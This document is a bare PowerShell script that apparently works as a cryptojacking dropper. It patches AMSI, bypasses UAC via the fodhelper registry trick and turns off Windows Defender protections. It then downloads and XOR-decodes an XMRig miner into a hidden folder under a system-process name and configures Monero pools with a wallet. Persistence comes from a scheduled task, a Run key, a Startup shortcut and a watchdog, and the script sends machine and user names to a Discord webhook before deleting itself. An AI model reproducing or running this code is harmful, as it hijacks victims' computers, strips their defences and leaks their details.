try{
$d=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siU'+'tils')
$f=$d.GetField('am'+'siIn'+'itFailed','NonPublic,Static')
$ptr=$f.GetValue($null)
[Runtime.InteropServices.Marshal]::Copy([byte[]](0x01),0,$ptr,1)
}catch{}

try{
$a=[Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')
$m=$a.GetType('System.Management.Automation.Am'+'siUt'+'ils').GetMethod('ScanB'+'uffer','NonPublic,Static')
$p=[Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($m)
[Runtime.InteropServices.VirtualProtect]$p=[uint32]1024
}catch{}

$wc=New-Object Net.WebClient
function X([string]$s){$b=[Convert]::FromBase64String($s);return [Text.Encoding]::UTF8.GetString($b)}
function XorDec([byte[]]$d,[byte[]]$k){$o=New-Object byte[] $d.Length;for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i] -bxor $k[$i % $k.Length]};return $o}

$_u='NTY3ZzFtZWl6RmUzMUd6Rk1HN3hveTN5eFRoRzU2cDdOTnp1dEtmZjdZUGkxRGFkQWRya1kyeExqOXpMV2paTm00aGZYb0YydXhhNlBnSkNXUWM2UVVoNjROR3BYRUw='
$_p='cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw=='
$_pb='cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM='
$_e='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hcm96MTIzL0Zvb3RiYWxsL21haW4veG1yaWdfZW5jLmJpbg=='
$_d='aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MDkzNzk2MjE3MzE2OTgwNC9ILVdMLW1jUFlqQW5ESDJyaHh5MnVNV2w4U0lkbmN5dE5JMWNuWEhaTkVwaWo2YlI2Y0NhTzNFaER1bHEzMUtCSjZRVA=='
$_x='TXlTZWNyZXRLZXkxMjM0NQ=='
$_s="$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache"
$_m="SearchProtocolHost.exe"

function Invoke-UACBypass{
$c=[Convert]::FromBase64String('cG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiU3RhcnQtU2xlZXAgMzsgUmVtb3ZlLUl0ZW0gLVBhdGggJ0hLQ1U6XFNvZnR3YXJlXENsYXNzZXNcbXMtc2V0dGluZ3MnIC1SZWN1cnNlIC1Gb3JjZSI=')
$h=[Convert]::FromBase64String('Zm9kaGVscGVyLmV4ZQ==')
$r=[Microsoft.Win32.Registry]::CurrentUser.CreateSubKey("Software\Classes\ms-settings\Shell\Open\Command")
$r.SetValue('',$c)
$r.SetValue('DelegateExecute','')
Start-Process $h
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
}

function Invoke-DefenseEvasion{
try{
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -ExclusionProcess $m -ErrorAction SilentlyContinue
}catch{}
}

function Install-Miner{
if(!(Test-Path $_s)){New-Item -Path $_s -ItemType Directory -Force|Out-Null}
Set-ItemProperty $_s -Name Attributes -Value 'Hidden,System' -ErrorAction SilentlyContinue
$enc=$wc.DownloadData((X $_e))
$key=[Text.Encoding]::UTF8.GetBytes((X $_x))
$dec=XorDec $enc $key
[System.IO.File]::WriteAllBytes("$_s\$_m",$dec)
}

function Write-MinerConfig{
$p=(X $_u)
$pl=(X $_p)
$pb=(X $_pb)
$cfg='{"api-mode":null,"donate-level":0,"donate-over-proxy":0,"log-file":null,"print-time":60,"health-print-time":60,"retries":5,"retry-pause":5,"syslog":false,"watch":true,"opencl-platform":-1,"algo":"rx/0","coins":"monero","pools":[{"url":"' + $pl + '","user":"' + $p + '","keepalive":true,"tls":true,"tls-fingerprint":null},{"url":"' + $pb + '","user":"' + $p + '","keepalive":true,"tls":true,"tls-fingerprint":null}],"cpu":true}'
$cfg|Out-File -FilePath "$_s\config.json" -Encoding UTF8 -Force
}

function Set-Persistence{
$t=New-ScheduledTaskTrigger -AtLogOn
$a=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$_s\watchdog.ps1`""
$r=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -TaskName "SearchProtocolHost" -Trigger $t,$a -Action $a -RunLevel Highest -Force|Out-Null
}

function Set-DeepPersistence{
try{
$k=[Microsoft.Win32.Registry]::CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
$k.SetValue("NetworkServiceCache","powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$_s\watchdog.ps1`"")
$k.Close()
$sh="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\NetworkServiceCache.lnk"
$ws=New-Object -ComObject WScript.Shell
$s=$ws.CreateShortcut($sh)
$s.TargetPath="powershell.exe"
$s.Arguments="-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$_s\watchdog.ps1`""
$s.Save()
}catch{}
}

function Write-StealthWatchdog{
$w="# watchdog"
$w+='
`$ErrorActionPreference=''SilentlyContinue'''
$w+='
while(`$true){'
$w+='
`$proc=Get-Process -Name ''SearchProtocolHost'' -ErrorAction SilentlyContinue'
$w+='
if(!`$proc){'
$w+='
Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"'+$_s+'\miner.ps1`"" -WindowStyle Hidden'
$w+='
}'
$w+='
Start-Sleep 60'
$w+='
}'
$w|Out-File -FilePath "$_s\watchdog.ps1" -Encoding UTF8 -Force
}

function Write-SelfHealScript{
$m='# miner'
$m+='
`$ErrorActionPreference=''SilentlyContinue'''
$m+='
Start-Sleep 10'
$m+='
`$k=[byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35)'
$m+='
function X([string]`$s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$s))}'
$m+='
function XorDec([byte[]]`$d,[byte[]]`$k){`$o=New-Object byte[] `$d.Length;for(`$i=0;`$i -lt `$d.Length;`$i++){`$o[`$i]=`$d[`$i] -bxor `$k[`$i % `$k.Length]};return `$o}'
$m+='
`$wc=New-Object Net.WebClient'
$m+='
`$enc=`$wc.DownloadData((X ''aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hcm96MTIzL0Zvb3RiYWxsL21haW4veG1yaWdfZW5jLmJpbg==''))'
$m+='
`$dec=XorDec `$enc `$k'
$m+='
`$_s="`$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache"'
$m+='
`$_m="SearchProtocolHost.exe"'
$m+='
if(!(Test-Path `$_s)){New-Item -Path `$_s -ItemType Directory -Force|Out-Null}'
$m+='
Set-ItemProperty `$_s -Name Attributes -Value ''Hidden,System'' -ErrorAction SilentlyContinue'
$m+='
[System.IO.File]::WriteAllBytes("`$_s\`$_m",`$dec)'
$m+='
`$p=(X ''NTY3ZzFtZWl6RmUzMUd6Rk1HN3hveTN5eFRoRzU2cDdOTnp1dEtmZjdZUGkxRGFkQWRya1kyeExqOXpMV2paTm00aGZYb0YydXhhNlBnSkNXUWM2UVVoNjROR3BYRUw='')'
$m+='
`$pl=(X ''cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw=='')'
$m+='
`$pb=(X ''cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM='')'
$m+='
`$cfg=''{''''api-mode'''':null,''''donate-level'''':0,''''pools'''':[{''''url'''':""'' + $pl + ''","'''user'''':""'' + $p + ''","'''keepalive'''':true,''''tls'''':true}],''''cpu'''':true}'''
$m+='
`$cfg|Out-File -FilePath "`$_s\config.json" -Encoding UTF8 -Force'
$m+='
Start-Process -FilePath "`$_s\`$_m" -ArgumentList "-c `$_s\config.json" -WindowStyle Hidden'
$m|Out-File -FilePath "$_s\miner.ps1" -Encoding UTF8 -Force
}

function Send-DiscordWebhook{
param([string]$msg)
try{
$wc2=New-Object Net.WebClient
$body=@{content=$msg}|ConvertTo-Json
$wc2.Headers.Add('Content-Type','application/json')
$wc2.UploadString((X $_d),'POST',$body)
}catch{}
}

function Enable-HugePages{
try{
cmd /c "reg add HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management /v LargeSystemCache /t REG_DWORD /d 1 /f" 2>$null
cmd /c "bcdedit /set increaseuserva 3072" 2>$null
}catch{}
}

function Disable-Sleep{
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
powercfg /change monitor-timeout-ac 0
powercfg /change monitor-timeout-dc 0
}

function Start-RandomDelay{
$delay = Get-Random -Minimum 30 -Maximum 120
Start-Sleep $delay
}

if(![Environment]::Is64BitOperatingSystem){return}
if($env:PROCESSOR_ARCHITECTURE-ne'AMD64'){return}

Start-RandomDelay

try{Invoke-UACBypass}catch{}
try{Invoke-DefenseEvasion}catch{}
try{Enable-HugePages}catch{}
try{Disable-Sleep}catch{}
try{Install-Miner}catch{}
try{Write-MinerConfig}catch{}
try{Write-StealthWatchdog}catch{}
try{Write-SelfHealScript}catch{}
try{Set-Persistence}catch{}
try{Set-DeepPersistence}catch{}

Start-Process -FilePath "$_s\$_m" -ArgumentList "-c `$_s\config.json" -WindowStyle Hidden

Send-DiscordWebhook "New deployment: $env:COMPUTERNAME | $env:USERNAME | $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

try{
Remove-Item -Path $MyInvocation.MyCommand.Source -Force -ErrorAction SilentlyContinue
}catch{}
